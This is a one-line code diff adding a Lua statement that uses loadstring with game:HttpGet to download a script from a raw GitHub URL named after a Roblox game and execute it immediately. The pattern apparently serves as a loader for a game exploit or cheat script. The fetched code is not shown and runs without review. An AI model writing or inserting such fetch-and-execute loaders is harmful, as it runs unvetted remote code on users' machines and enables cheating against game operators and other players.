@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/liillmses-maker/Zcchja/refs/heads/main/Legend-Of-Zominus-RPG"))()
